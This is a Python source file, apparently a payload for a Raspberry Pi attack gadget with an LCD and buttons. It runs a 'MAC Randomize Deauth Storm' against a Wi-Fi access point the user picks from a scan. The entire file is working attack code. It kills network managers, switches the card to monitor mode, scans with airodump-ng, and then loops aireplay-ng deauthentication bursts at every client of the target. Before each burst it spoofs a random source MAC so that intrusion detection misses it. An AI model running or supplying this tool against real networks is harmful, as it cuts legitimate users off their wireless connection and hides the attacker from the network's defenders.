#!/usr/bin/env python3
"""
KTOx payload - MAC Randomize Deauth Storm
===========================================
Ported from Raspyjack by 7h30th3r0n3.
Sends deauth frames with randomised source MACs to evade detection.
Targets all clients on a network or a specific BSSID.

Features:
- Randomises source MAC on every burst to evade IDS/IPS
- Target all clients on AP or specific client MAC
- Adjustable burst rate and packet count
- Channel lock on target
- Real-time client count on LCD

Controls:
- UP/DOWN: navigate APs
- OK: select and start storm
- KEY1: increase burst rate
- KEY2: decrease burst rate
- KEY3: stop/exit
"""
import sys, os, time, subprocess, threading, random, re
from datetime import datetime

if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

try:
    import RPi.GPIO as GPIO
    import LCD_1in44
    from PIL import Image, ImageDraw, ImageFont
    HAS_HW = True
except ImportError:
    HAS_HW = False

PINS = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
        "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
W, H = 128, 128
_stop = threading.Event()


def run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return r.stdout.strip()
    except Exception:
        return ""


def rand_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))


def font(size=8):
    try:
        return ImageFont.truetype(
            "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf", size)
    except Exception:
        return ImageFont.load_default()


class Display:
    def __init__(self):
        self.lcd = None
        if HAS_HW:
            try:
                GPIO.setmode(GPIO.BCM)
                GPIO.setwarnings(False)
                for pin in PINS.values():
                    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
                self.lcd = LCD_1in44.LCD()
                self.lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
                self.lcd.LCD_Clear()
            except Exception as e:
                print(f"LCD: {e}")

    def show(self, title, lines, col="#ff2200"):
        img  = Image.new("RGB", (W, H), "black")
        draw = ImageDraw.Draw(img)
        draw.rectangle((0, 0, W, 14), fill="#cc0000")
        draw.text((3, 2), title[:20], fill="white", font=font(9))
        y = 18
        for line in (lines or []):
            draw.text((3, y), str(line)[:21], fill=col, font=font(8))
            y += 11
            if y > H - 8:
                break
        if self.lcd:
            try: self.lcd.LCD_ShowImage(img, 0, 0)
            except: pass
        else:
            print(f"[{title}]", lines)

    def btn(self):
        if not HAS_HW:
            return None
        for name, pin in PINS.items():
            try:
                if GPIO.input(pin) == GPIO.LOW:
                    return name
            except: pass
        return None


def enable_monitor(iface="wlan0"):
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type monitor")
    run(f"ip link set {iface} up")
    return iface + "mon" if run(f"iw dev {iface}mon info") else iface


def disable_monitor(iface="wlan0"):
    run(f"airmon-ng stop {iface}mon 2>/dev/null")
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up")


def scan_aps(mon, disp):
    disp.show("SCANNING", ["Looking for APs...", "~15 seconds"])
    tmp = f"/tmp/ktox_rdscan_{int(time.time())}"
    proc = subprocess.Popen(
        f"airodump-ng --output-format csv -w {tmp} {mon}",
        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(15)
    proc.terminate()

    aps = []
    csv = f"{tmp}-01.csv"
    if os.path.exists(csv):
        for line in open(csv, errors="ignore"):
            parts = [p.strip() for p in line.split(",")]
            if len(parts) >= 14 and re.match(r"([0-9A-Fa-f]{2}:){5}", parts[0]):
                bssid = parts[0]
                ch    = parts[3].strip()
                essid = parts[13].strip()
                aps.append((bssid, ch, essid))
        try: os.remove(csv)
        except: pass
    return aps


def deauth_worker(mon, bssid, burst, disp):
    count = 0
    while not _stop.is_set():
        fake_mac = rand_mac()
        # Spoof our source MAC before sending
        run(f"ip link set {mon} address {fake_mac} 2>/dev/null")
        run(f"aireplay-ng --deauth {burst} -a {bssid} {mon} 2>/dev/null",
            timeout=10)
        count += burst
        disp.show("STORM ACTIVE", [
            f"BSSID: {bssid[:17]}",
            f"Pkts sent: {count}",
            f"Src MAC: {fake_mac[:17]}",
            f"Burst: {burst}",
            "",
            "KEY3=stop",
        ], col="#ff2200")
        time.sleep(0.5)


def main():
    disp  = Display()
    iface = "wlan0"
    mon   = None

    try:
        disp.show("MAC DEAUTH", ["Enabling monitor...", "Please wait"])
        run(f"airmon-ng check kill 2>/dev/null")
        mon = enable_monitor(iface)
        time.sleep(1)

        aps = scan_aps(mon, disp)
        if not aps:
            disp.show("NO APs FOUND", ["Scan returned 0 APs", "KEY3 to exit"])
            while disp.btn() != "KEY3":
                time.sleep(0.1)
            return

        cursor = 0
        burst  = 5

        while True:
            bssid, ch, essid = aps[cursor]
            disp.show("SELECT TARGET", [
                f"> {essid[:18]}",
                f"  {bssid}",
                f"  CH: {ch}",
                f"  {cursor+1}/{len(aps)}",
                "",
                f"Burst: {burst}  KEY1+/KEY2-",
                "OK=start KEY3=exit",
            ])

            btn = None
            for _ in range(20):
                btn = disp.btn()
                if btn:
                    break
                time.sleep(0.05)

            if btn == "UP":
                cursor = (cursor - 1) % len(aps)
                time.sleep(0.2)
            elif btn == "DOWN":
                cursor = (cursor + 1) % len(aps)
                time.sleep(0.2)
            elif btn == "KEY1":
                burst = min(burst + 5, 100)
                time.sleep(0.2)
            elif btn == "KEY2":
                burst = max(burst - 5, 1)
                time.sleep(0.2)
            elif btn == "KEY3":
                return
            elif btn == "OK":
                break

        bssid, ch, essid = aps[cursor]
        run(f"iwconfig {mon} channel {ch} 2>/dev/null")

        _stop.clear()
        t = threading.Thread(
            target=deauth_worker, args=(mon, bssid, burst, disp), daemon=True)
        t.start()

        while disp.btn() != "KEY3":
            time.sleep(0.1)

        _stop.set()
        t.join(timeout=3)
        disp.show("STOPPED", ["Deauth storm ended", "KEY3 to exit"])
        time.sleep(1)

    except KeyboardInterrupt:
        pass
    finally:
        _stop.set()
        if mon:
            # Restore original MAC
            run(f"ip link set {mon} address $(cat /sys/class/net/{iface}/address) 2>/dev/null")
            disable_monitor(iface)
        if HAS_HW:
            try: GPIO.cleanup()
            except: pass
        print("[MACDeauth] Exited.")


if __name__ == "__main__":
    main()
